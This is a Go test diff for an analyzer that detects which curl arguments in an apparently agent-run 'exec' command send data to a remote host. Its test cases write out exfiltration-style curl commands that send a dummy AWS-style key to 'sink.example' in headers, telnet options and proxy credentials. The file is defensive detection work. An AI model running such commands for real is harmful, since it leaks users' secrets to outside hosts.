@@ -28,6 +28,14 @@ func testCurlCapability(digest string, protocols, features []string) CurlCapabil
 	}
 }
 
+func testCurlHTTPSProxyCapability() CurlCapability {
+	return testCurlCapability(
+		curlCapabilityFullDigest,
+		[]string{"http", "https"},
+		[]string{"https-proxy", "ssl"},
+	)
+}
+
 func TestCurlCapabilityFactsStayCallerAuthenticated(t *testing.T) {
 	t.Parallel()
 
@@ -185,6 +193,53 @@ func TestCurlCapabilityFactsStayCallerAuthenticated(t *testing.T) {
 			},
 			wantHeader: true,
 		},
+		{
+			name: "proxy-http2 stays closed without http2",
+			input: Input{
+				Tool: "exec",
+				Argv: []string{
+					"curl", "--proxy-http2", "--header", "X-Key: " + token,
+					"https://sink.example/upload",
+				},
+				CurlCapabilities: []CurlCapability{testCurlCapability(
+					curlCapabilityFullDigest,
+					[]string{"http", "https"},
+					[]string{"https-proxy", "ssl"},
+				)},
+			},
+		},
+		{
+			name: "version 7.88.1 cannot authorize proxy-http2",
+			input: Input{
+				Tool: "exec",
+				Argv: []string{
+					"curl", "--proxy-http2", "--header", "X-Key: " + token,
+					"https://sink.example/upload",
+				},
+				CurlCapabilities: []CurlCapability{{
+					Executable: "curl",
+					Digest:     curlCapabilityFullDigest,
+					Version:    "7.88.1",
+					Protocols:  []string{"http", "https"},
+					Features:   []string{"https-proxy", "http2", "ssl"},
+				}},
+			},
+		},
+		{
+			name: "libz without protocols cannot restore compressed header",
+			input: Input{
+				Tool: "exec",
+				Argv: []string{
+					"curl", "--compressed", "--header", "X-Key: " + token,
+					"https://sink.example/upload",
+				},
+				CurlCapabilities: []CurlCapability{testCurlCapability(
+					curlCapabilityFullDigest,
+					nil,
+					[]string{"libz"},
+				)},
+			},
+		},
 	} {
 		test := test
 		t.Run(test.name, func(t *testing.T) {
@@ -218,6 +273,179 @@ func TestCurlCapabilityFactsStayCallerAuthenticated(t *testing.T) {
 			if hasHost != test.wantHTTPSHostname {
 				t.Fatalf("HTTPS proxy hostname = %t, want %t hosts=%#v",
 					hasHost, test.wantHTTPSHostname, hosts)
+			}
+		})
+	}
+}
+
+func TestCurlCapabilityProtocolAndHTTPSProxyRestore(t *testing.T) {
+	t.Parallel()
+
+	const token = "AKIA7Q2M9X4B6C8D3F5H"
+	httpHTTPS := testCurlCapability(
+		curlCapabilityFullDigest,
+		[]string{"http", "https"},
+		[]string{"https-proxy", "http2", "ssl"},
+	)
+	for _, test := range []struct {
+		name             string
+		input            Input
+		wantTelnet       bool
+		wantProxyUser    bool
+		wantProxyPath    bool
+		wantAfterConnect bool
+		wantHeader       bool
+	}{
+		{
+			name: "http https protocols cannot authorize Telnet projection",
+			input: Input{
+				Tool: "exec",
+				Argv: []string{
+					"curl", "--telnet-option", "TTYPE=" + token,
+					"telnet://sink.example",
+				},
+				CurlCapabilities: []CurlCapability{httpHTTPS},
+			},
+		},
+		{
+			name: "missing capability keeps Telnet projection",
+			input: Input{
+				Tool: "exec",
+				Argv: []string{
+					"curl", "--telnet-option", "TTYPE=" + token,
+					"telnet://sink.example",
+				},
+			},
+			wantTelnet: true,
+		},
+		{
+			name: "HTTPS proxy without capability hides proxy-user and path",
+			input: Input{
+				Tool: "exec",
+				Argv: []string{
+					"curl", "--proxy", "https://proxy.example",
+					"--proxy-user", "proxy:" + token,
+					"http://origin.example/secrets/" + token,
+				},
+			},
+		},
+		{
+			name: "attested https-proxy restores proxy-user and path",
+			input: Input{
+				Tool: "exec",
+				Argv: []string{
+					"curl", "--proxy", "https://proxy.example",
+					"--proxy-user", "proxy:" + token,
+					"http://origin.example/secrets/" + token,
+				},
+				CurlCapabilities: []CurlCapability{testCurlHTTPSProxyCapability()},
+			},
+			wantProxyUser: true,
+			wantProxyPath: true,
+		},
+		{
+			name: "HTTPS after-CONNECT stays closed without capability",
+			input: Input{
+				Tool: "exec",
+				Argv: []string{
+					"curl", "-p", "--proxy", "https://proxy.example",
+					"--header", "X-Key: " + token, "http://127.0.0.1/upload",
+				},
+			},
+			wantHeader: true,
+		},
+		{
+			name: "attested https-proxy restores after-CONNECT path and header",
+			input: Input{
+				Tool: "exec",
+				Argv: []string{
+					"curl", "-p", "--proxy", "https://proxy.example",
+					"--header", "X-Key: " + token, "http://127.0.0.1/upload",
+				},
+				CurlCapabilities: []CurlCapability{testCurlHTTPSProxyCapability()},
+			},
+			wantAfterConnect: true,
+			wantHeader:       true,
+		},
+		{
+			name: "proxy-http2 restores when https-proxy and http2 are attested",
+			input: Input{
+				Tool: "exec",
+				Argv: []string{
+					"curl", "--proxy-http2", "--header", "X-Key: " + token,
+					"https://sink.example/upload",
+				},
+				CurlCapabilities: []CurlCapability{httpHTTPS},
+			},
+			wantHeader: true,
+		},
+	} {
+		test := test
+		t.Run(test.name, func(t *testing.T) {
+			t.Parallel()
+			facts := Analyze(test.input)
+			if len(facts.Commands) != 1 {
+				t.Fatalf("commands = %#v", facts.Commands)
+			}
+			command := facts.Commands[0]
+			telnet := StaticCurlTelnetOptionRequestComponents(command)
+			hasTelnet := false
+			for _, component := range telnet {
+				if component.Value == token && component.Scheme == "telnet" {
+					hasTelnet = true
+					break
+				}
+			}
+			if hasTelnet != test.wantTelnet {
+				t.Fatalf("Telnet projection = %t, want %t components=%#v",
+					hasTelnet, test.wantTelnet, telnet)
+			}
+			proxy := StaticCurlProxyTransmittedMetadata(command)
+			hasProxyUser := false
+			hasProxyPath := false
+			for _, component := range proxy.ProxyRequestComponents {
+				if component.Value == "proxy:"+token {
+					hasProxyUser = true
+				}
+				if component.Value == "/secrets/"+token {
+					hasProxyPath = true
+				}
+			}
+			if hasProxyUser != test.wantProxyUser {
+				t.Fatalf("proxy-user projected = %t, want %t components=%#v",
+					hasProxyUser, test.wantProxyUser, proxy.ProxyRequestComponents)
+			}
+			if hasProxyPath != test.wantProxyPath {
+				t.Fatalf("proxy path projected = %t, want %t components=%#v",
+					hasProxyPath, test.wantProxyPath, proxy.ProxyRequestComponents)
+			}
+			after := staticCurlHTTPAfterCONNECTRequestComponents(command)
+			hasAfterHeader := false
+			hasAfterPath := false
+			for _, component := range after {
+				if component.Value == "X-Key: "+token {
+					hasAfterHeader = true
+				}
+				if component.Value == "/upload" {
+					hasAfterPath = true
+				}
+			}
+			gotAfter := hasAfterHeader && hasAfterPath
+			if gotAfter != test.wantAfterConnect {
+				t.Fatalf("after-CONNECT = %t, want %t components=%#v",
+					gotAfter, test.wantAfterConnect, after)
+			}
+			headers := StaticCurlTransmittedMetadata(command).Headers
+			hasHeader := false
+			for _, header := range headers {
+				if header == "X-Key: "+token {
+					hasHeader = true
+					break
+				}
+			}
+			if hasHeader != test.wantHeader {
+				t.Fatalf("header projected = %t, want %t headers=%#v",
+					hasHeader, test.wantHeader, headers)
 			}
 		})
 	}
